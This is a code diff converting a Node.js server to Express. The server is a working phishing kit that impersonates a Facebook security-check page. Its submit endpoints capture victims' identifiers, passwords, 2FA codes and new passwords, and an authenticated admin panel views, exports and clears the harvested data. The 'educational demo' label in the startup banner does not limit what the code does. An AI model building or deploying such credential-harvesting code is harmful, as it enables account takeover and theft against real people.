@@ -1,7 +1,6 @@
-const http = require('http');
+const express = require('express');
 const fs = require('fs');
 const path = require('path');
-const url = require('url');
 
 (function loadDotenv() {
   const files = [path.join(__dirname, '.env.local'), path.join(__dirname, '.env')];
@@ -29,175 +28,116 @@ const url = require('url');
 })();
 
 const { applyNoCache, confirmationHtml, twoFaHtml, renderAdmin, requireAdminAuth } = require('./api/_html');
-const { getAll, addEntry, clearAll } = require('./api/_storage');
+const { addEntry, getAll, clearAll } = require('./api/_storage');
 
-const PORT = process.env.PORT || 80;
-const PUBLIC_DIR = path.join(__dirname, 'public');
+const app = express();
+const PORT = parseInt(process.env.PORT, 10) || 3000;
 
-function readBody(req) {
-  return new Promise((resolve, reject) => {
-    let data = '';
-    req.on('data', (chunk) => {
-      data += chunk.toString();
-      if (data.length > 1e6) return reject(new Error('Body too large'));
-    });
-    req.on('end', () => resolve(data));
-    req.on('error', reject);
-  });
-}
+app.disable('x-powered-by');
+app.use(express.json({ limit: '1mb' }));
+app.use(express.urlencoded({ extended: true, limit: '1mb' }));
 
-function parseBody(raw, contentType) {
-  if (!raw) return {};
-  try {
-    if (contentType && contentType.includes('application/json')) return JSON.parse(raw);
-    return new URLSearchParams(raw);
-  } catch { return {}; }
-}
+const STATIC_DIRS = [__dirname, path.join(__dirname, 'public')];
 
-function sendFile(res, filePath, statusCode = 200) {
-  fs.readFile(filePath, (err, data) => {
-    if (err) {
-      res.statusCode = 500;
-      return res.end('Server error');
-    }
-    const ext = path.extname(filePath).toLowerCase();
-    const mime = {
-      '.html': 'text/html; charset=utf-8',
-      '.css': 'text/css; charset=utf-8',
-      '.js': 'application/javascript; charset=utf-8',
-      '.json': 'application/json; charset=utf-8',
-      '.svg': 'image/svg+xml',
-      '.png': 'image/png',
-      '.jpg': 'image/jpeg',
-      '.jpeg': 'image/jpeg',
-      '.ico': 'image/x-icon'
-    };
-    res.statusCode = statusCode;
-    res.setHeader('Content-Type', mime[ext] || 'application/octet-stream');
-    res.end(data);
-  });
-}
-
-const server = http.createServer(async (req, res) => {
-  const parsed = url.parse(req.url, true);
-  const pathname = parsed.pathname.replace(/\/$/, '') || '/';
-
-  if (req.method === 'POST' && (pathname === '/submit' || pathname === '/api/submit')) {
-    applyNoCache(res);
-    let body = {};
+function trySendStatic(res, file) {
+  for (const dir of STATIC_DIRS) {
+    const full = path.join(dir, file);
     try {
-      const raw = await readBody(req);
-      const parsedBody = parseBody(raw, req.headers['content-type']);
-      body = parsedBody instanceof URLSearchParams ? Object.fromEntries(parsedBody) : parsedBody;
-    } catch {}
-
-    const entry = {
-      timestamp: new Date().toLocaleString('fr-FR'),
-      identifier: body.identifier || '',
-      old_password: body.oldPassword || '',
-      code_2fa: '',
-      new_password: '',
-      confirm_password: ''
-    };
-
-    try { await addEntry(entry); } catch (err) { console.warn('[submit]', err.message); }
-
-    res.statusCode = 200;
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    return res.end(confirmationHtml);
+      if (fs.existsSync(full)) {
+        res.sendFile(full);
+        return true;
+      }
+    } catch (e) {}
   }
+  return false;
+}
 
-  if (req.method === 'POST' && (pathname === '/submit-2fa' || pathname === '/api/submit-2fa')) {
-    applyNoCache(res);
-    let body = {};
-    try {
-      const raw = await readBody(req);
-      const parsedBody = parseBody(raw, req.headers['content-type']);
-      body = parsedBody instanceof URLSearchParams ? Object.fromEntries(parsedBody) : parsedBody;
-    } catch {}
-
-    const entry = {
-      timestamp: new Date().toLocaleString('fr-FR'),
-      identifier: body.identifier || '',
-      old_password: body.oldPassword || '',
-      code_2fa: body.code_2fa || '',
-      new_password: body.newPassword || '',
-      confirm_password: body.confirmPassword || ''
-    };
-
-    try { await addEntry(entry); } catch (err) { console.warn('[submit-2fa]', err.message); }
-
-    res.statusCode = 200;
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    return res.end(confirmationHtml);
-  }
-
-  if (pathname === '/admin') {
-    if (!requireAdminAuth(req, res)) return;
-    applyNoCache(res);
-    let data = [];
-    try { data = await getAll(); } catch {}
-    res.statusCode = 200;
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    return res.end(renderAdmin(data));
-  }
-
-  if (pathname === '/admin/export' || pathname === '/api/admin/export') {
-    if (!requireAdminAuth(req, res)) return;
-    applyNoCache(res);
-    let data = [];
-    try { data = await getAll(); } catch {}
-    const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
-    res.statusCode = 200;
-    res.setHeader('Content-Type', 'application/json; charset=utf-8');
-    res.setHeader('Content-Disposition', `attachment; filename="captured_data_${stamp}.json"`);
-    return res.end(JSON.stringify(data, null, 2));
-  }
-
-  if (pathname === '/admin/clear' || pathname === '/api/admin/clear') {
-    if (!requireAdminAuth(req, res)) return;
-    applyNoCache(res);
-    try { await clearAll(); } catch {}
-    res.statusCode = 302;
-    res.setHeader('Location', '/admin');
-    return res.end();
-  }
-
-  if (pathname === '/' || pathname === '/security' || pathname === '/security/check' || pathname === '/login/identify') {
-    return sendFile(res, path.join(PUBLIC_DIR, 'index.html'));
-  }
-
-  const safePath = path.normalize(pathname).replace(/^(\.\.[\/\\])+/, '');
-  const filePath = path.join(PUBLIC_DIR, safePath);
-  if (filePath.indexOf(PUBLIC_DIR) !== 0) {
-    res.statusCode = 403;
-    return res.end('Forbidden');
-  }
-  fs.stat(filePath, (err, stat) => {
-    if (err || !stat.isFile()) {
-      return sendFile(res, path.join(PUBLIC_DIR, 'index.html'), 200);
-    }
-    sendFile(res, filePath);
-  });
+app.get(['/', '/security', '/security/check', '/login/identify'], (req, res) => {
+  applyNoCache(res);
+  if (trySendStatic(res, 'index.html')) return;
+  res.status(404).send('index.html introuvable');
 });
 
-server.listen(PORT, () => {
-  console.log('\n==================================================');
-  console.log('  facebook.com/security - Projet pedagogique');
-  console.log('==================================================');
-  console.log('');
-  if (String(PORT) === '80') {
-    console.log('  FORMULAIRE  : http://localhost/security');
-    console.log('  PANEL ADMIN : http://localhost/admin');
-  } else {
-    console.log(`  FORMULAIRE  : http://localhost:${PORT}/security`);
-    console.log(`  PANEL ADMIN : http://localhost:${PORT}/admin`);
-  }
-  console.log('');
-  console.log('  Compatible VERCEL : fichiers dans ./api/*.js prets');
-  console.log('  Donnees sauvegardees dans : captured_data.json (local)');
-  console.log('                           ou KV Redis (sur Vercel)');
-  console.log('');
-  console.log('  Ctrl + C pour arreter');
-  console.log('');
+app.post('/submit', async (req, res) => {
+  applyNoCache(res);
+  const body = req.body || {};
+  const entry = {
+    timestamp: new Date().toLocaleString('fr-FR'),
+    identifier: body.identifier || '',
+    old_password: body.oldPassword || '',
+    code_2fa: '',
+    new_password: '',
+    confirm_password: ''
+  };
+  try { await addEntry(entry); } catch (err) { console.warn('[submit] addEntry failed', err && err.message); }
+  res.status(200).type('text/html; charset=utf-8').send(confirmationHtml);
 });
+
+app.post('/submit-2fa', async (req, res) => {
+  applyNoCache(res);
+  const body = req.body || {};
+  const entry = {
+    timestamp: new Date().toLocaleString('fr-FR'),
+    identifier: body.identifier || '',
+    old_password: body.oldPassword || '',
+    code_2fa: body.code_2fa || '',
+    new_password: body.newPassword || '',
+    confirm_password: body.confirmPassword || ''
+  };
+  try { await addEntry(entry); } catch (err) { console.warn('[submit-2fa] addEntry failed', err && err.message); }
+  res.status(200).type('text/html; charset=utf-8').send(confirmationHtml);
+});
+
+app.get('/admin', async (req, res) => {
+  if (!requireAdminAuth(req, res)) return;
+  applyNoCache(res);
+  let data = [];
+  try { data = await getAll(); } catch (err) { console.warn('[admin] getAll failed', err && err.message); }
+  res.status(200).type('text/html; charset=utf-8').send(renderAdmin(data));
+});
+
+app.get('/admin/export', async (req, res) => {
+  if (!requireAdminAuth(req, res)) return;
+  applyNoCache(res);
+  let data = [];
+  try { data = await getAll(); } catch (err) { console.warn('[admin-export] getAll failed', err && err.message); }
+  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+  res.setHeader('Content-Disposition', `attachment; filename="captured_data_${stamp}.json"`);
+  res.status(200).type('application/json; charset=utf-8').send(JSON.stringify(data, null, 2));
+});
+
+app.get('/admin/clear', async (req, res) => {
+  if (!requireAdminAuth(req, res)) return;
+  applyNoCache(res);
+  try { await clearAll(); } catch (err) { console.warn('[admin-clear] clearAll failed', err && err.message); }
+  res.redirect(302, '/admin');
+});
+
+app.use((req, res) => {
+  res.status(404).type('text/plain; charset=utf-8').send('404 NOT_FOUND');
+});
+
+if (require.main === module) {
+  app.listen(PORT, () => {
+    const width = 60;
+    const sep = '═'.repeat(width);
+    console.log('\n' + sep);
+    console.log('  facebook.com/security  •  Demo éducative Phishing');
+    console.log(sep);
+    console.log(`  Mode        : SERVEUR EXPRESS (Node ${process.version})`);
+    console.log(`  Port        : ${PORT}`);
+    console.log(`  Lien local  : http://localhost:${PORT}/security`);
+    console.log(`  Panel admin : http://localhost:${PORT}/admin`);
+    const u = (process.env.ADMIN_USER || '').trim();
+    const p = (process.env.ADMIN_PASSWORD || '').trim();
+    if (u || p) {
+      const masked = p ? '*'.repeat(Math.min(p.length, 12)) : '(vide)';
+      console.log(`  Auth Admin  : user="${u || '(vide)'}"  mdp="${masked}"  (HTTP Basic Auth)`);
+    } else {
+      console.log('  ⚠ Auth Admin  : AUCUN (accès public - déconseillé)');
+    }
+    console.log(sep + '\n');
+  });
+}
+
+module.exports = app;
